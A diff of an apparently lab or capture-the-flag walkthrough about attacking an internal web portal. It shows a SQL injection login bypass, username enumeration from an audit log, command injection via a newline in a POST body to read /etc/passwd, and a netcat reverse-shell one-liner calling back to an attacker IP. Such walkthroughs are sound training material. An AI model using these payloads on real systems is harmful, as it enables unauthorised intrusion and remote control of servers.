@@ -46,14 +46,93 @@ http://10.112.173.195:5050/internal
 
 ### 🧪 Testing for Authentication Bypass (SQL Injection)
 
-Finally, we hit an interactive login form to test for security flaws and potential authentication bypasses[cite: 1]. 
+Finally, we hit an interactive login form to test for security flaws and potential authentication bypasses.
 
-I immediately started testing the login fields for SQL Injection (SQLi) vulnerabilities[cite: 1].
+I immediately started testing the login fields for SQL Injection (SQLi) vulnerabilities.
 
 ```
 Admin' OR 1=1--
 ```
 <img alt="Zrzut ekranu 2026-09-6 o 16 12 15" src="https://github.com/user-attachments/assets/bf2f392e-dd86-471d-9c27-e4632fbe0e89" />
+
+### 🔓 Authentication Bypass Successful
+
+The SQLi payload worked smoothly and bypassed the authentication check using the payload `Admin' OR 1=1--` with a dummy password (`admin`).
+
+<img alt="Zrzut ekranu 2026-09-6 o 16 13 41" src="https://github.com/user-attachments/assets/7086b581-16d2-4b39-b12b-3a72e8402f26" />
+
+### 📜 Enumerating the Audit Log & Usernames
+
+Exploring the dashboard revealed a useful **Audit Log** section containing system activity records[cite: 1]. 
+
+This log exposed several legitimate operator usernames registered on the portal (such as `netops`, `jmartin`, and `svc-mon`), providing valuable targets for potential credential attack vectors.
+
+<img alt="Zrzut ekranu 2026-09-6 o 16 14 57" src="https://github.com/user-attachments/assets/edc53b97-fedc-4ccb-95b2-b95b8d702736" />
+
+### 🎯 Analyzing the Host Health Probe
+
+While the dashboard features are useful, the most critical element from a penetration testing perspective is the interactive **Host Health** tool. 
+
+This utility accepts IP addresses or hostnames to execute diagnostic reachability probes (such as ping checks), providing a direct vector to test for command injection vulnerabilities.
+
+<img alt="Zrzut ekranu 2026-09-6 o 16 15 51" src="https://github.com/user-attachments/assets/9b330676-f6b1-40c6-bbbb-9a2d4dfb1821" />
+
+### 🧪 Initial Command Injection Attempt
+
+I tried testing for command injection right through the browser input form by appending special payload characters (like URL-encoded newlines `%0A`). 
+
+However, the application failed to parse the input correctly and returned a standard connection error, indicating frontend validation or bad input handling on the form level.
+
+<img alt="Zrzut ekranu 2026-09-6 o 16 16 59" src="https://github.com/user-attachments/assets/64730a1d-eb28-49cb-a7a9-5a981584d581" />
+
+### 🛠️ Intercepting & Modifying the Probe Request
+
+To bypass client-side restrictions, I switched tactics: first, I executed a legitimate probe request by entering `127.0.0.1` into the input field and clicking **Run Code**.
+
+Next, I opened the browser Developer Tools (`F12`), navigated to the **Network** tab, and located the outgoing request to the backend endpoint. Using the browser's built-in **Edit and Resend** functionality, I was able to manually modify the HTTP body parameters before replaying the payload directly to the server.
+
+<img alt="Zrzut ekranu 2026-09-6 o 16 17 47" src="https://github.com/user-attachments/assets/f3bee11c-b302-4305-95b7-0c20894132dc" />
+
+### 💥 Injecting System Commands in the Request Body
+
+Scrolling down to the request body editor, we can inject a custom payload into the `target` parameter. 
+
+Here, we re-apply the URL-encoded newline technique (`%0A`) to append an arbitrary command directly after the IP address:
+
+```http
+POST /internal/health HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+target=127.0.0.1%0Acat+/etc/passwd
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 18 50" src="https://github.com/user-attachments/assets/bea0cae6-d455-468e-a9a6-6a6ddf47f944" />
+<img alt="Zrzut ekranu 2026-09-6 o 16 19 06" src="https://github.com/user-attachments/assets/60a001e1-1391-47c7-bca7-7a22b5440800" />
+<img alt="Zrzut ekranu 2026-09-6 o 16 19 25" src="https://github.com/user-attachments/assets/7d27b3fc-c0be-488a-a744-1e7b077b1956" />
+
+### 🐚 Achieving Remote Code Execution & Preparing Penelope Listener
+
+The server processed our injected payload and returned the full contents of `/etc/passwd`.
+
+<img alt="Zrzut ekranu 2026-09-6 o 16 20 23" src="https://github.com/user-attachments/assets/628dae32-6a69-4009-a636-712835b8940e" />
+
+### 🛠️ Generating the Reverse Shell Payload
+
+Next, I used RevShells to quickly build a reliable Netcat payload designed to spawn a standard `/bin/sh` session:
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.112.97.123 4444 >/tmp/f
+```
+<img alt="Zrzut ekranu 2026-09-6 o 16 21 14" src="https://github.com/user-attachments/assets/788439a4-6679-4310-8727-38dfa496184c" />
+
+<img alt="Zrzut ekranu 2026-09-6 o 16 24 34" src="https://github.com/user-attachments/assets/030dc890-f191-4468-a708-4c5d6a928512" />
+
+
+
+
+
+
+
+
 
 
 
